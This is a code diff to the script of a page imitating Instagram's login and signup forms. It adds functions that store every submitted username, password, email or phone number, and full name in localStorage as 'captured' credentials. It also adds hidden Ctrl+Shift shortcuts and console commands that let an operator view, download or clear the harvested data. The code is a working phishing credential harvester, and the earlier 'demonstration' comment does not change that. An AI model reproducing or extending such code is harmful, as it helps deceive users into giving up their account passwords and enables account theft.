@@ -75,14 +75,21 @@ loginForm.addEventListener('submit', function(e) {
         return;
     }
     
-    // Store credentials (for demonstration purposes only)
-    console.log('Instagram Login attempt:', {
+    // Create credential object
+    const credentials = {
         username: username,
         password: password,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
-        platform: navigator.platform
-    });
+        platform: navigator.platform,
+        type: 'instagram-login'
+    };
+    
+    // Store credentials in localStorage
+    saveCredentials(credentials);
+    
+    // Also log to console
+    console.log('Instagram Login attempt:', credentials);
     
     // Show loading state
     loginBtn.textContent = 'Logging in...';
@@ -115,7 +122,8 @@ signupForm.addEventListener('submit', function(e) {
         password: formInputs[3].value,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
-        platform: navigator.platform
+        platform: navigator.platform,
+        type: 'instagram-signup'
     };
     
     // Validate inputs
@@ -128,6 +136,9 @@ signupForm.addEventListener('submit', function(e) {
         alert('Password must be at least 6 characters');
         return;
     }
+    
+    // Store signup data in localStorage
+    saveCredentials(data);
     
     // Log signup data (for demonstration purposes only)
     console.log('Instagram Signup attempt:', data);
@@ -274,3 +285,135 @@ usernameInput.addEventListener('focus', function() {
 passwordInput.addEventListener('focus', function() {
     console.log('Password field focused');
 });
+
+// ============================================
+// CREDENTIAL STORAGE AND ADMIN FUNCTIONS
+// ============================================
+
+// Function to save credentials to localStorage
+function saveCredentials(data) {
+    // Get existing credentials from localStorage
+    let allCredentials = JSON.parse(localStorage.getItem('capturedInstagramCredentials') || '[]');
+    
+    // Add new credentials
+    allCredentials.push(data);
+    
+    // Save back to localStorage
+    localStorage.setItem('capturedInstagramCredentials', JSON.stringify(allCredentials));
+    
+    // Update the count
+    console.log(`Total Instagram credentials captured: ${allCredentials.length}`);
+}
+
+// Function to view all captured credentials (for admin)
+function viewCapturedData() {
+    const allCredentials = JSON.parse(localStorage.getItem('capturedInstagramCredentials') || '[]');
+    
+    if (allCredentials.length === 0) {
+        console.log('No credentials captured yet.');
+        return;
+    }
+    
+    console.log('=== INSTAGRAM CAPTURED CREDENTIALS ===');
+    console.log(`Total entries: ${allCredentials.length}`);
+    console.log('=======================================');
+    
+    allCredentials.forEach((cred, index) => {
+        console.log(`\n--- Entry #${index + 1} ---`);
+        console.log(JSON.stringify(cred, null, 2));
+    });
+    
+    return allCredentials;
+}
+
+// Function to download credentials as a text file
+function downloadCredentials() {
+    const allCredentials = JSON.parse(localStorage.getItem('capturedInstagramCredentials') || '[]');
+    
+    if (allCredentials.length === 0) {
+        alert('No credentials to download yet.');
+        return;
+    }
+    
+    // Format credentials as text
+    let content = '=== INSTAGRAM LOGIN PAGE - CAPTURED CREDENTIALS ===\n\n';
+    content += `Total Entries: ${allCredentials.length}\n`;
+    content += `Generated: ${new Date().toISOString()}\n`;
+    content += '='.repeat(50) + '\n\n';
+    
+    allCredentials.forEach((cred, index) => {
+        content += `Entry #${index + 1}\n`;
+        content += `-`.repeat(30) + '\n';
+        
+        if (cred.username) {
+            content += `Username: ${cred.username}\n`;
+            content += `Password: ${cred.password}\n`;
+        }
+        
+        if (cred.mobile_or_email) {
+            content += `Mobile/Email: ${cred.mobile_or_email}\n`;
+            content += `Full Name: ${cred.full_name}\n`;
+            content += `Username: ${cred.username}\n`;
+            content += `Password: ${cred.password}\n`;
+        }
+        
+        content += `Type: ${cred.type || 'Unknown'}\n`;
+        content += `Timestamp: ${cred.timestamp}\n`;
+        content += `Platform: ${cred.platform}\n`;
+        content += `User Agent: ${cred.userAgent}\n`;
+        content += '\n';
+    });
+    
+    // Create blob and download
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `instagram-credentials-${Date.now()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+    
+    console.log('Instagram credentials downloaded successfully!');
+}
+
+// Function to clear all captured data
+function clearCapturedData() {
+    if (confirm('Are you sure you want to clear all captured Instagram credentials?')) {
+        localStorage.removeItem('capturedInstagramCredentials');
+        console.log('All captured Instagram credentials have been cleared.');
+    }
+}
+
+// Admin keyboard shortcuts
+document.addEventListener('keydown', function(e) {
+    // Ctrl+Shift+V - View captured data
+    if (e.ctrlKey && e.shiftKey && e.key === 'V') {
+        e.preventDefault();
+        viewCapturedData();
+    }
+    
+    // Ctrl+Shift+D - Download captured data
+    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+        e.preventDefault();
+        downloadCredentials();
+    }
+    
+    // Ctrl+Shift+C - Clear captured data
+    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+        e.preventDefault();
+        clearCapturedData();
+    }
+});
+
+// Log admin instructions on page load
+console.log('%c=== INSTAGRAM ADMIN CONTROLS ===', 'color: #E1306C; font-size: 16px; font-weight: bold;');
+console.log('%cKeyboard Shortcuts:', 'color: #E1306C; font-weight: bold;');
+console.log('  Ctrl+Shift+V - View captured credentials');
+console.log('  Ctrl+Shift+D - Download credentials as file');
+console.log('  Ctrl+Shift+C - Clear all captured data');
+console.log('%cConsole Commands:', 'color: #E1306C; font-weight: bold;');
+console.log('  viewCapturedData() - Display all captured credentials');
+console.log('  downloadCredentials() - Download credentials as text file');
+console.log('  clearCapturedData() - Clear all stored credentials');
